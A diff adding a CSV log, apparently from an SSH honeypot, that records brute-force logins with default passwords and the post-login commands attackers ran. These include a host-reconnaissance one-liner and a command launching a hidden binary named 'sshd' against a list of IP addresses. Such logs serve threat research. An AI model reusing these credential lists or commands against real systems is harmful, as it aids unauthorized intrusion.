@@ -1,0 +1,57 @@
+Timestamp,Event Type,IP Address,Location,Username,Password,Command
+2026-03-17T04:11:15.972259Z,LOGIN SUCCESS,72.196.199.171,United States - Cox Communications Inc.,root,ZeroShadowLabs123,
+2026-03-17T04:11:35.382591Z,COMMAND ISSUED,72.196.199.171,United States - Cox Communications Inc.,,,exit
+2026-03-17T06:40:52.459681Z,LOGIN FAILED,139.19.117.131,Germany - Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.,admin,,
+2026-03-17T06:40:52.558934Z,LOGIN FAILED,139.19.117.131,Germany - Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.,admin,,
+2026-03-17T08:37:31.108373Z,LOGIN FAILED,139.19.117.131,Germany - Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.,admin,,
+2026-03-17T08:37:31.202012Z,LOGIN FAILED,139.19.117.131,Germany - Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.,admin,,
+2026-03-17T09:27:36.519359Z,LOGIN SUCCESS,23.97.62.131,Singapore - Microsoft Corporation,root,adminadmin,
+2026-03-17T09:49:12.605137Z,LOGIN SUCCESS,23.97.62.131,Singapore - Microsoft Corporation,root,administrator,
+2026-03-17T10:12:49.497314Z,LOGIN SUCCESS,23.97.62.131,Singapore - Microsoft Corporation,root,Administrator,
+2026-03-17T11:02:36.405556Z,LOGIN SUCCESS,23.97.62.131,Singapore - Microsoft Corporation,root,admin1234,
+2026-03-17T12:47:48.290351Z,LOGIN SUCCESS,185.39.118.137,Russia - Renet Com,root,ubuntu,
+2026-03-17T12:51:41.453625Z,COMMAND ISSUED,185.39.118.137,Russia - Renet Com,,,chmod +x ./.5597861461335253596/sshd;nohup ./.5597861461335253596/sshd 122.225.202.151 103.239.252.132 118.122.147.195 115.231.220.63 157.245.116.37 103.147.14.105 69.87.207.135 93.170.72.100 194.163.142.177 106.74.27.94 220.181.172.244 51.210.149.136 117.173.221.93 103.217.187.128 158.51.96.38 43.247.68.87 106.13.27.219 103.147.14.19 103.218.243.223 96.44.170.208 31.7.59.202 122.10.115.18 58.221.68.240 103.231.253.70 101.200.159.29 120.48.7.234 58.22.105.66 103.143.11.137 50.6.231.169 182.201.244.26 221.178.246.21 23.165.104.184 103.39.222.143 41.93.28.4 148.72.168.29 156.227.232.239 220.194.79.36 101.91.114.194 187.141.210.92 111.6.14.234 198.46.253.100 106.75.71.120 123.54.197.60 101.132.33.119 87.251.19.5 206.189.206.75 47.236.178.171 103.143.231.99 178.160.228.51 121.28.170.66 156.227.233.245 &
+2026-03-17T13:54:21.063838Z,LOGIN FAILED,188.166.125.48,"Netherlands - DigitalOcean, LLC",root,root,
+2026-03-17T13:55:19.802703Z,LOGIN SUCCESS,188.166.125.48,"Netherlands - DigitalOcean, LLC",root,admin,
+2026-03-17T13:55:20.982564Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E ""model name|Hardware"" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"""",$2); print $2; exit}' ; dmidecode -s processor-version 2>/dev/null | head -n1 ; uname -p 2>/dev/null) | awk 'NF{print; exit}' ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia) 2>/dev/null | head -n50); cat_help=$( (cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1); ls_help=$( (ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1); last_output=$(last 2>/dev/null | head -n 10); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""CAT_HELP:$cat_help""; echo ""LS_HELP:$ls_help""; echo ""LAST:$last_output"""
+2026-03-17T13:55:20.983145Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,uname -s -v -n -m 2 > /dev/null
+2026-03-17T13:55:20.984002Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,uname -m 2 > /dev/null
+2026-03-17T13:55:20.984761Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,cat /proc/uptime 2 > /dev/null | cut -d. -f1
+2026-03-17T13:56:16.693458Z,LOGIN SUCCESS,188.166.125.48,"Netherlands - DigitalOcean, LLC",root,password,
+2026-03-17T13:56:17.271762Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E ""model name|Hardware"" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"""",$2); print $2; exit}' ; dmidecode -s processor-version 2>/dev/null | head -n1 ; uname -p 2>/dev/null) | awk 'NF{print; exit}' ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia) 2>/dev/null | head -n50); cat_help=$( (cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1); ls_help=$( (ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1); last_output=$(last 2>/dev/null | head -n 10); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""CAT_HELP:$cat_help""; echo ""LS_HELP:$ls_help""; echo ""LAST:$last_output"""
+2026-03-17T13:56:17.272320Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,uname -s -v -n -m 2 > /dev/null
+2026-03-17T13:56:17.273169Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,uname -m 2 > /dev/null
+2026-03-17T13:56:17.273943Z,COMMAND ISSUED,188.166.125.48,"Netherlands - DigitalOcean, LLC",,,cat /proc/uptime 2 > /dev/null | cut -d. -f1
+2026-03-17T13:56:59.113008Z,LOGIN FAILED,188.166.125.48,"Netherlands - DigitalOcean, LLC",root,123456,
+2026-03-17T15:32:56.803935Z,LOGIN FAILED,139.19.117.131,Germany - Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.,admin,,
+2026-03-17T15:32:56.901357Z,LOGIN FAILED,139.19.117.131,Germany - Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.,admin,,
+2026-03-17T17:40:50.644137Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",ubuntu,ubuntu,
+2026-03-17T17:40:57.587562Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",user7,123456,
+2026-03-17T17:41:04.225118Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",flink,flink,
+2026-03-17T17:41:10.902118Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",rajvir,rajvir123,
+2026-03-17T17:41:17.595095Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",oracle,123456,
+2026-03-17T17:41:24.022007Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",gary,gary,
+2026-03-17T17:41:30.734236Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",flask,flask,
+2026-03-17T17:41:37.171580Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",grid,grid,
+2026-03-17T17:41:43.759577Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",solr,solr,
+2026-03-17T17:41:50.430257Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",dolphinscheduler,dolphinscheduler123,
+2026-03-17T17:41:56.918957Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",centos,centos,
+2026-03-17T17:42:03.465466Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",rock,rock,
+2026-03-17T17:42:10.064440Z,LOGIN SUCCESS,104.248.53.138,"United States - DigitalOcean, LLC",root,admin@123,
+2026-03-17T17:42:10.097992Z,COMMAND ISSUED,104.248.53.138,"United States - DigitalOcean, LLC",,,uname -s -v -n -r -m
+2026-03-17T17:42:16.630959Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",minecraft,1,
+2026-03-17T17:42:23.037663Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",minecraft,mc,
+2026-03-17T17:42:29.670967Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",docker,docker123,
+2026-03-17T17:42:36.037985Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",ubuntu,123456789,
+2026-03-17T17:42:42.619135Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",odoo,odoo,
+2026-03-17T17:42:49.085764Z,LOGIN SUCCESS,104.248.53.138,"United States - DigitalOcean, LLC",root,1q2w3e4r,
+2026-03-17T17:42:49.121876Z,COMMAND ISSUED,104.248.53.138,"United States - DigitalOcean, LLC",,,uname -s -v -n -r -m
+2026-03-17T17:42:55.833117Z,LOGIN SUCCESS,104.248.53.138,"United States - DigitalOcean, LLC",root,qq123456,
+2026-03-17T17:42:55.871660Z,COMMAND ISSUED,104.248.53.138,"United States - DigitalOcean, LLC",,,uname -s -v -n -r -m
+2026-03-17T17:43:02.247183Z,LOGIN SUCCESS,104.248.53.138,"United States - DigitalOcean, LLC",root,Huawei@123,
+2026-03-17T17:43:02.294708Z,COMMAND ISSUED,104.248.53.138,"United States - DigitalOcean, LLC",,,uname -s -v -n -r -m
+2026-03-17T17:43:08.754102Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",user,password,
+2026-03-17T17:43:15.167072Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",user2,user2,
+2026-03-17T17:43:21.709666Z,LOGIN FAILED,104.248.53.138,"United States - DigitalOcean, LLC",stack,stack,
+2026-03-17T17:43:28.406216Z,LOGIN SUCCESS,104.248.53.138,"United States - DigitalOcean, LLC",root,!QAZ2wsx3edc,
+2026-03-17T17:43:28.453140Z,COMMAND ISSUED,104.248.53.138,"United States - DigitalOcean, LLC",,,uname -s -v -n -r -m
